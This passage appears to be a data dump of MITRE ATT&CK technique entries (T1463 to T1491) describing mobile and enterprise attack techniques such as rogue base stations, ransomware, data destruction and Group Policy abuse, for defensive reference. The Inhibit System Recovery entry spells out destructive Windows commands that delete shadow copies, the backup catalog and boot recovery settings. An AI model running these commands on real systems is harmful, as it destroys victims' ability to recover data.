                          'without being detected. For example, FireEye researchers found in 2014 that 68% of the top '
                          '1,000 free applications in the Google Play Store had at least one Transport Layer Security '
                          "(TLS) implementation vulnerability potentially opening the applications' network traffic to "
                          'man-in-the-middle attacks (Citation: FireEye-SSL).',
           'name': 'Manipulate Device Communication',
           'platforms': ['Android', 'iOS']},
 'T1464': {'attack_id': 'T1464',
           'categories': ['network-effects'],
           'description': 'An attacker could jam radio signals (e.g. Wi-Fi, cellular, GPS) to prevent the mobile '
                          'device from communicating. (Citation: NIST-SP800187)(Citation: CNET-Celljammer)(Citation: '
                          'NYTimes-Celljam)(Citation: Digitaltrends-Celljam)(Citation: Arstechnica-Celljam)',
           'name': 'Jamming or Denial of Service',
           'platforms': ['Android', 'iOS']},
 'T1465': {'attack_id': 'T1465',
           'categories': ['network-effects'],
           'description': 'An adversary could set up unauthorized Wi-Fi access points or compromise existing access '
                          'points and, if the device connects to them, carry out network-based attacks such as '
                          'eavesdropping on or modifying network communication(Citation: NIST-SP800153)(Citation: '
                          'Kaspersky-DarkHotel).',
           'name': 'Rogue Wi-Fi Access Points',
           'platforms': ['Android', 'iOS']},
 'T1466': {'attack_id': 'T1466',
           'categories': ['network-effects'],
           'description': 'An adversary could cause the mobile device to use less secure protocols, for example by '
                          'jamming frequencies used by newer protocols such as LTE and only allowing older protocols '
                          'such as GSM to communicate(Citation: NIST-SP800187). Use of less secure protocols may make '
                          'communication easier to eavesdrop upon or manipulate.',
           'name': 'Downgrade to Insecure Protocols',
           'platforms': ['Android', 'iOS']},
 'T1467': {'attack_id': 'T1467',
           'categories': ['network-effects'],
           'description': 'An adversary could set up a rogue cellular base station and then use it to eavesdrop on or '
                          'manipulate cellular device communication. A compromised cellular femtocell could be used to '
                          'carry out this technique(Citation: Computerworld-Femtocell).',
           'name': 'Rogue Cellular Base Station',
           'platforms': ['Android', 'iOS']},
 'T1468': {'attack_id': 'T1468',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or "
                          'to an enterprise mobility management (EMM) / mobile device management (MDM) server console '
                          'could use that access to track mobile devices.(Citation: Krebs-Location)',
           'name': 'Remotely Track Device Without Authorization',
           'platforms': ['Android', 'iOS']},
 'T1469': {'attack_id': 'T1469',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or "
                          'to an EMM console could use that access to wipe enrolled devices (Citation: Honan-Hacking).',
           'name': 'Remotely Wipe Data Without Authorization',
           'platforms': ['Android', 'iOS']},
 'T1470': {'attack_id': 'T1470',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use "
                          'that access to obtain sensitive data stored in device backups. For example, the Elcomsoft '
                          "Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's "
                          'iCloud (Citation: Elcomsoft-EPPB). Elcomsoft also describes (Citation: Elcomsoft-WhatsApp) '
                          'obtaining WhatsApp communication histories from backups stored in iCloud.',
           'name': 'Obtain Device Cloud Backups',
           'platforms': ['Android', 'iOS']},
 'T1471': {'attack_id': 'T1471',
           'categories': ['effects'],
           'description': 'An adversary may encrypt files stored on the mobile device to prevent the user from '
                          'accessing them, for example with the intent of only unlocking access to the files after a '
                          'ransom is paid. Without escalated privileges, the adversary is generally limited to only '
                          'encrypting files in external/shared storage locations. This technique has been demonstrated '
                          'on Android. We are unaware of any demonstrated use on iOS.',
           'name': 'Encrypt Files',
           'platforms': ['Android']},
 'T1472': {'attack_id': 'T1472',
           'categories': ['effects'],
           'description': 'An adversary could seek to generate fraudulent advertising revenue from mobile devices, for '
                          'example by triggering automatic clicks of advertising links without user involvement.',
           'name': 'Generate Fraudulent Advertising Revenue',
           'platforms': ['Android', 'iOS']},
 'T1474': {'attack_id': 'T1474',
           'categories': ['initial-access'],
           'description': 'As further described in [Supply Chain '
                          'Compromise](https://attack.mitre.org/techniques/T1195), supply chain compromise is the '
                          'manipulation of products or product delivery mechanisms prior to receipt by a final '
                          'consumer for the purpose of data or system compromise. Somewhat related, adversaries could '
                          'also identify and exploit inadvertently present vulnerabilities. In many cases, it may be '
                          'difficult to be certain whether exploitable functionality is due to malicious intent or '
                          'simply inadvertent mistake.\n'
                          '\n'
                          'Related PRE-ATT&CK techniques include:\n'
                          '\n'
                          '* [Identify vulnerabilities in third-party software '
                          'libraries](https://attack.mitre.org/techniques/T1389) - Third-party libraries incorporated '
                          'into mobile apps could contain malicious behavior, privacy-invasive behavior, or '
                          'exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or '
                          'could exploit inadvertent vulnerabilities. For example, Ryan Welton of NowSecure identified '
                          'exploitable remote code execution vulnerabilities in a third-party advertisement library '
                          '(Citation: NowSecure-RemoteCode). Grace et al. identified security issues in mobile '
                          'advertisement libraries (Citation: Grace-Advertisement).\n'
                          '* [Distribute malicious software development '
                          'tools](https://attack.mitre.org/techniques/T1394) - As demonstrated by the XcodeGhost '
                          'attack (Citation: PaloAlto-XcodeGhost1), app developers could be provided with modified '
                          'versions of software development tools (e.g. compilers) that automatically inject malicious '
                          'or exploitable code into applications.',
           'name': 'Supply Chain Compromise',
           'platforms': ['Android', 'iOS']},
 'T1475': {'attack_id': 'T1475',
           'categories': ['initial-access'],
           'description': 'Malicious applications are a common attack vector used by adversaries to gain a presence on '
                          'mobile devices. Mobile devices often are configured to allow application installation only '
                          'from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may '
                          'seek to place a malicious application in an authorized app store, enabling the application '
                          'to be installed onto targeted devices.\n'
                          '\n'
                          'App stores typically require developer registration and use vetting techniques to identify '
                          'malicious applications. Adversaries may use these techniques against app store defenses:\n'
                          '\n'
                          '* [Download New Code at Runtime](https://attack.mitre.org/techniques/T1407)\n'
                          '* [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1406)\n'
                          '* PRE-ATT&CK: [Choose pre-compromised mobile app developer account credentials or signing '
                          'keys](https://attack.mitre.org/techniques/T1391)\n'
                          '* PRE-ATT&CK: [Test ability to evade automated mobile application security analysis '
                          'performed by app stores](https://attack.mitre.org/techniques/T1393)\n'
                          '\n'
                          'Adversaries may also seek to evade vetting by placing code in a malicious application to '
                          'detect whether it is running in an app analysis environment and, if so, avoid performing '
                          'malicious actions while under analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) '
                          '(Citation: Percoco-Bouncer) (Citation: Wang)\n'
                          '\n'
                          'Adversaries may also use fake identities, payment cards, etc., to create developer accounts '
                          'to publish malicious applications to app stores. (Citation: Oberheide-Bouncer)\n'
                          '\n'
                          "Adversaries may also use control of a target's Google account to use the Google Play "
                          "Store's remote installation capability to install apps onto the Android devices associated "
                          'with the Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only '
                          'applications that are available for download through the Google Play Store can be remotely '
                          'installed using this technique.)',
           'name': 'Deliver Malicious App via Authorized App Store',
           'platforms': ['Android', 'iOS']},
 'T1476': {'attack_id': 'T1476',
           'categories': ['initial-access'],
           'description': 'Malicious applications are a common attack vector used by adversaries to gain a presence on '
                          'mobile devices. This technique describes installing a malicious application on targeted '
                          'mobile devices without involving an authorized app store (e.g., Google Play Store or Apple '
                          'App Store). Adversaries may wish to avoid placing malicious applications in an authorized '
                          'app store due to increased potential risk of detection or other reasons. However, mobile '
                          'devices often are configured to allow application installation only from an authorized app '
                          'store which would prevent this technique from working.\n'
                          '\n'
                          'Delivery methods for the malicious application include:\n'
                          '\n'
                          '* [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) - Including the '
                          'mobile app package as an attachment to an email message.\n'
                          '* [Spearphishing Link](https://attack.mitre.org/techniques/T1192) - Including a link to the '
                          'mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, '
                          'etc.), web site, QR code, or other means.\n'
                          '* Third-Party App Store - Installed from a third-party app store (as opposed to an '
                          'authorized app store that the device implicitly trusts as part of its default behavior), '
                          'which may not apply the same level of scrutiny to apps as applied by an authorized app '
                          'store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: '
                          'TrendMicro-FlappyBird)\n'
                          '\n'
                          'As a prerequisite, adversaries may use this PRE-ATT&CK technique:\n'
                          '\n'
                          '* [Obtain Apple iOS enterprise distribution key pair and '
                          'certificate](https://attack.mitre.org/techniques/T1392)',
           'name': 'Deliver Malicious App via Other Means',
           'platforms': ['Android', 'iOS']},
 'T1477': {'attack_id': 'T1477',
           'categories': ['initial-access'],
           'description': 'The mobile device may be targeted for exploitation through its interface to cellular '
                          'networks or other radio interfaces.\n'
                          '\n'
                          '### Baseband Vulnerability Exploitation\n'
                          '\n'
                          'A message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, '
                          'NFC, Wi-Fi(Citation: ProjectZero-BroadcomWiFi) or other) to the mobile device could exploit '
                          'a vulnerability in code running on the device(Citation: Register-BaseStation)(Citation: '
                          'Weinmann-Baseband).\n'
                          '\n'
                          '### Malicious SMS Message\n'
                          '\n'
                          'An SMS message could contain content designed to exploit vulnerabilities in the SMS parser '
                          'on the receiving device(Citation: Forbes-iPhoneSMS). An SMS message could also contain a '
                          'link to a web site containing malicious content designed to exploit the device web browser. '
                          'Vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages(Citation: '
                          'SRLabs-SIMCard).',
           'name': 'Exploit via Radio Interfaces',
           'platforms': ['Android', 'iOS']},
 'T1478': {'attack_id': 'T1478',
           'categories': ['defense-evasion', 'initial-access'],
           'description': 'An adversary could attempt to install insecure or malicious configuration settings on the '
                          'mobile device, through means such as phishing emails or text messages either directly '
                          'containing the configuration settings as an attachment, or containing a web link to the '
                          'configuration settings. The device user may be tricked into installing the configuration '
                          'settings through social engineering techniques (Citation: Symantec-iOSProfile).\n'
                          '\n'
                          'For example, an unwanted Certification Authority (CA) certificate could be placed in the '
                          "device's trusted certificate store, increasing the device's susceptibility to "
                          "man-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's "
                          'network communication ([Eavesdrop on Insecure Network '
                          'Communication](https://attack.mitre.org/techniques/T1439) and [Manipulate Device '
                          'Communication](https://attack.mitre.org/techniques/T1463)).\n'
                          '\n'
                          'On iOS, malicious Configuration Profiles could contain unwanted Certification Authority '
                          '(CA) certificates or other insecure settings such as unwanted proxy server or VPN settings '
                          "to route the device's network traffic through an adversary's system. The device could also "
                          'potentially be enrolled into a malicious Mobile Device Management (MDM) system (Citation: '
                          'Talos-MDM).',
           'name': 'Install Insecure or Malicious Configuration',
           'platforms': ['Android', 'iOS']},
 'T1480': {'attack_id': 'T1480',
           'categories': ['defense-evasion'],
           'description': 'Execution guardrails constrain execution or actions based on adversary supplied environment '
                          'specific conditions that are expected to be present on the target. \n'
                          '\n'
                          'Guardrails ensure that a payload only executes against an intended target and reduces '
                          'collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) '
                          'Values an adversary can provide about a target system or environment to use as guardrails '
                          'may include specific network share names, attached physical devices, files, joined Active '
                          'Directory (AD) domains, and local/external IP addresses.\n'
                          '\n'
                          'Environmental keying is one type of guardrail that includes cryptographic techniques for '
                          'deriving encryption/decryption keys from specific types of values in a given computing '
                          'environment.(Citation: EK Clueless Agents) Values can be derived from target-specific '
                          'elements and used to generate a decryption key for an encrypted payload. Target-specific '
                          'values can be derived from specific network shares, physical devices, software/software '
                          'versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: '
                          'Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding '
                          'Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By '
                          'generating the decryption keys from target-specific environmental values, environmental '
                          'keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and '
                          'reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: '
                          'Genetic Malware) These difficulties can slow down the incident response process and help '
                          'adversaries hide their tactics, techniques, and procedures (TTPs).\n'
                          '\n'
                          'Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), '
                          'adversaries may use guardrails and environmental keying to help protect their TTPs and '
                          'evade detection. For example, environmental keying may be used to deliver an encrypted '
                          'payload to the target that will use target-specific values to decrypt the payload before '
                          'execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware '
                          'Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: '
                          'Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload '
                          'the adversary can avoid packaging the decryption key with the payload or sending it over a '
                          'potentially monitored network connection. Depending on the technique for gathering '
                          'target-specific values, reverse engineering of the encrypted payload can be exceptionally '
                          'difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to '
                          'prevent exposure of capabilities in environments that are not intended to be compromised or '
                          'operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox '
                          'Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to '
                          'further engage because the value conditions specified by the adversary are meant to be '
                          'target specific and not such that they could occur in any environment.',
           'name': 'Execution Guardrails',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1481': {'attack_id': 'T1481',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use an existing, legitimate external Web service as a means for relaying '
                          'commands to a compromised system.\n'
                          '\n'
                          'These commands may also include pointers to command and control (C2) infrastructure. '
                          'Adversaries may post content, known as a dead drop resolver, on Web services with embedded '
                          '(and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach '
                          'out to and be redirected by these resolvers.\n'
                          '\n'
                          'Popular websites and social media acting as a mechanism for C2 may give a significant '
                          'amount of cover due to the likelihood that hosts within a network are already communicating '
                          'with them prior to a compromise. Using common services, such as those offered by Google or '
                          'Twitter, makes it easier for adversaries to hide in expected noise. Web service providers '
                          'commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n'
                          '\n'
                          'Use of Web services may also protect back-end C2 infrastructure from discovery through '
                          'malware binary analysis while also enabling operational resiliency (since this '
                          'infrastructure may be dynamically changed).',
           'name': 'Web Service',
           'platforms': ['Android', 'iOS']},
 'T1482': {'attack_id': 'T1482',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to gather information on domain trust relationships that may be '
                          'used to identify [Lateral Movement](https://attack.mitre.org/tactics/TA0008) opportunities '
                          'in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain '
                          'to allow access to resources based on the authentication procedures of another '
                          'domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to '
                          'access resources in the trusting domain. The information discovered may help the adversary '
                          'conduct [SID-History Injection](https://attack.mitre.org/techniques/T1178), [Pass the '
                          'Ticket](https://attack.mitre.org/techniques/T1097), and '
                          '[Kerberoasting](https://attack.mitre.org/techniques/T1208).(Citation: AdSecurity Forging '
                          'Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the '
                          'DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain '
                          'Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to '
                          'be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation '
                          'Wilysupply)',
           'name': 'Domain Trust Discovery',
           'platforms': ['Windows']},
 'T1483': {'attack_id': 'T1483',
           'categories': ['command-and-control'],
           'description': 'Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a '
                          'destination for command and control traffic rather than relying on a list of static IP '
                          'addresses or domains. This has the advantage of making it much harder for defenders block, '
                          'track, or take over the command and control channel, as there potentially could be '
                          'thousands of domains that malware can check for instructions.(Citation: Cybereason '
                          'Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n'
                          '\n'
                          'DGAs can take the form of apparently random or “gibberish” strings (ex: '
                          'istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. '
                          'Alternatively, some DGAs employ whole words as the unit by concatenating words together '
                          'instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different '
                          'domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value '
                          'as well to make predicting future domains more difficult for defenders.(Citation: '
                          'Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup '
                          '2017)(Citation: Akamai DGA Mitigation)\n'
                          '\n'
                          'Adversaries may use DGAs for the purpose of [Fallback '
                          'Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary '
                          'command and control server malware may employ a DGA as a means to reestablishing command '
                          'and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: '
                          'ESET Sednit 2017 Activity)',
           'name': 'Domain Generation Algorithms',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1484': {'attack_id': 'T1484',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary '
                          'access controls for a domain, usually with the intention of escalating privileges on the '
                          'domain. \n'
                          '\n'
                          'Group policy allows for centralized management of user and computer settings in Active '
                          'Directory (AD). GPOs are containers for group policy settings made up of files stored '
                          'within a predicable network path '
                          '<code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet '
                          'Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n'
                          '\n'
                          'Like other objects in AD, GPOs have access controls associated with them. By default all '
                          'user accounts in the domain have permission to read GPOs. It is possible to delegate GPO '
                          'access control permissions, e.g. write access, to specific users or groups in the domain.\n'
                          '\n'
                          'Malicious GPO modifications can be used to implement [Scheduled '
                          'Task](https://attack.mitre.org/techniques/T1053), [Disabling Security '
                          'Tools](https://attack.mitre.org/techniques/T1089), [Remote File '
                          'Copy](https://attack.mitre.org/techniques/T1105), [Create '
                          'Account](https://attack.mitre.org/techniques/T1136), [Service '
                          'Execution](https://attack.mitre.org/techniques/T1035) and more.(Citation: ADSecurity GPO '
                          'Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO '
                          'Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) '
                          'Since GPOs can control so many user and machine settings in the AD environment, there are a '
                          'great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide '
                          'to GPOs) Publicly available scripts such as <code>New-GPOImmediateTask</code> can be '
                          'leveraged to automate the creation of a malicious [Scheduled '
                          'Task](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case '
                          'modifying '
                          '<code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: '
                          'Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary '
                          'might modify specific user rights like SeEnableDelegationPrivilege, set in '
                          '<code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to '
                          'achieve a subtle AD backdoor with complete control of the domain because the user account '
                          "under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y "
                          'SeEnableDelegationPrivilege Right)\n',
           'name': 'Group Policy Modification',
           'platforms': ['Windows']},
 'T1485': {'attack_id': 'T1485',
           'categories': ['impact'],
           'description': 'Adversaries may destroy data and files on specific systems or in large numbers on a network '
                          'to interrupt availability to systems, services, and network resources. Data destruction is '
                          'likely to render stored data irrecoverable by forensic techniques through overwriting files '
                          'or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye '
                          'Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill '
                          '2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common '
                          'operating system file deletion commands such as <code>del</code> and <code>rm</code> often '
                          'only remove pointers to files without wiping the contents of the files themselves, making '
                          'the files recoverable by proper forensic methodology. This behavior is distinct from [Disk '
                          'Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure '
                          'Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed '
                          "rather than sections of a storage disk or the disk's logical structure.\n"
                          '\n'
                          'Adversaries may attempt to overwrite files and directories with randomly generated data to '
                          'make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 '
                          '2018) In some cases politically oriented image files have been used to overwrite '
                          'data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)\n'
                          '\n'
                          'To maximize impact on the target organization in operations where network-wide availability '
                          'interruption is the goal, malware designed for destroying data may have worm-like features '
                          'to propagate across a network by leveraging additional techniques like [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon '
                          '2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)',
           'name': 'Data Destruction',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1486': {'attack_id': 'T1486',
           'categories': ['impact'],
           'description': 'Adversaries may encrypt data on target systems or on large numbers of systems in a network '
                          'to interrupt availability to system and network resources. They can attempt to render '
                          'stored data inaccessible by encrypting files or data on local and remote drives and '
                          'withholding access to a decryption key. This may be done in order to extract monetary '
                          'compensation from a victim in exchange for decryption or a decryption key (ransomware) or '
                          'to render data permanently inaccessible in cases where the key is not saved or '
                          'transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: '
                          'US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is '
                          'typical that common user files like Office documents, PDFs, images, videos, audio, text, '
                          'and source code files will be encrypted. In some cases, adversaries may encrypt critical '
                          'system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\n'
                          '\n'
                          'To maximize impact on the target organization, malware designed for encrypting data may '
                          'have worm-like features to propagate across a network by leveraging other attack techniques '
                          'like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: FireEye WannaCry '
                          '2017)(Citation: US-CERT NotPetya 2017)',
           'name': 'Data Encrypted for Impact',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1487': {'attack_id': 'T1487',
           'categories': ['impact'],
           'description': 'Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot '
                          'systems; targeting specific critical systems as well as a large number of systems in a '
                          'network to interrupt availability to system and network resources. \n'
                          '\n'
                          'Adversaries may attempt to render the system unable to boot by overwriting critical data '
                          'located in structures such as the master boot record (MBR) or partition table.(Citation: '
                          'Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov '
                          '2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data '
                          'contained in disk structures may include the initial executable code for loading an '
                          'operating system or the location of the file system partitions on disk. If this information '
                          'is not present, the computer will not be able to load an operating system during the boot '
                          'process, leaving the computer unavailable. [Disk Structure '
                          'Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along '
                          'with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a '
                          'disk are wiped.\n'
                          '\n'
                          'To maximize impact on the target organization, malware designed for destroying disk '
                          'structures may have worm-like features to propagate across a network by leveraging other '
                          'techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon '
                          '2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: '
                          'Kaspersky StoneDrill 2017)',
           'name': 'Disk Structure Wipe',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1488': {'attack_id': 'T1488',
           'categories': ['impact'],
           'description': 'Adversaries may erase the contents of storage devices on specific systems as well as large '
                          'numbers of systems in a network to interrupt availability to system and network resources.\n'
                          '\n'
                          'Adversaries may partially or completely overwrite the contents of a storage device '
                          'rendering the data irrecoverable through the storage interface.(Citation: Novetta '
                          'Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony '
                          '2018) Instead of wiping specific disk structures or files, adversaries with destructive '
                          'intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may '
                          'acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of '
                          'disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have '
                          'been observed leveraging third-party drivers like '
                          '[RawDisk](https://attack.mitre.org/software/S0364) to directly access disk '
                          'content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) '
                          'This behavior is distinct from [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased '
                          'instead of individual files.\n'
                          '\n'
                          'To maximize impact on the target organization in operations where network-wide availability '
                          'interruption is the goal, malware used for wiping disk content may have worm-like features '
                          'to propagate across a network by leveraging additional techniques like [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078), [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin '
                          'Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster '
                          'Destructive Malware)',
           'name': 'Disk Content Wipe',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1489': {'attack_id': 'T1489',
           'categories': ['impact'],
           'description': 'Adversaries may stop or disable services on a system to render those services unavailable '
                          'to legitimate users. Stopping critical services can inhibit or stop response to an incident '
                          "or aid in the adversary's overall objectives to cause damage to the environment.(Citation: "
                          'Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n'
                          '\n'
                          'Adversaries may accomplish this by disabling individual services of high importance to an '
                          'organization, such as <code>MSExchangeIS</code>, which will make Exchange content '
                          'inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or '
                          'disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer '
                          '2018) Services may not allow for modification of their data stores while running. '
                          'Adversaries may stop services in order to conduct [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for '
                          'Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like '
                          'Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)',
           'name': 'Service Stop',
           'platforms': ['Windows']},
 'T1490': {'attack_id': 'T1490',
           'categories': ['impact'],
           'description': 'Adversaries may delete or remove built-in operating system data and turn off services '
                          'designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos '
                          'Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain '
                          'features that can help fix corrupted systems, such as a backup catalog, volume shadow '
                          'copies, and automatic repair features. Adversaries may disable or delete system recovery '
                          'features to augment the effects of [Data '
                          'Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for '
                          'Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer '
                          '2018)(Citation: FireEye WannaCry 2017)\n'
                          '\n'
                          'A number of native Windows utilities have been used by adversaries to disable or delete '
                          'system recovery features:\n'
                          '\n'
                          '* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - '
                          '<code>vssadmin.exe delete shadows /all /quiet</code>\n'
                          '* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be '
                          'used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n'
                          '* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - '
                          '<code>wbadmin.exe delete catalog -quiet</code>\n'
                          '* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by '
                          'modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy '
                          'ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>',
           'name': 'Inhibit System Recovery',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1491': {'attack_id': 'T1491',
           'categories': ['impact'],
           'description': 'Adversaries may modify visual content available internally or externally to an enterprise '
                          'network. Reasons for Defacement include delivering messaging, intimidation, or claiming '
                          '(possibly false) credit for an intrusion. \n'
                          '\n'
                          '### Internal\n'
                          'An adversary may deface systems internal to an organization in an attempt to intimidate or '
                          'mislead users. This may take the form of modifications to internal websites, or directly to '
                          'user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) '
                          'Disturbing or offensive images may be used as a part of Defacement in order to cause user '
                          'discomfort, or to pressure compliance with accompanying messages. While internally defacing '
                          "systems exposes an adversary's presence, it often takes place after other intrusion goals "
                          'have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)\n'
                          '\n'
                          '### External \n'
                          'Websites are a common victim of defacement; often targeted by adversary and hacktivist '
                          'groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber '
                          'Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on '
                          'Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) Defacement may be used '
                          'as a catalyst to trigger events, or as a response to actions taken by an organization or '
                          'government. Similarly, website defacement may also be used as setup, or a precursor, for '
                          'future attacks such as [Drive-by '
                          'Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive '
                          'Into Defacement)\n',
           'name': 'Defacement',
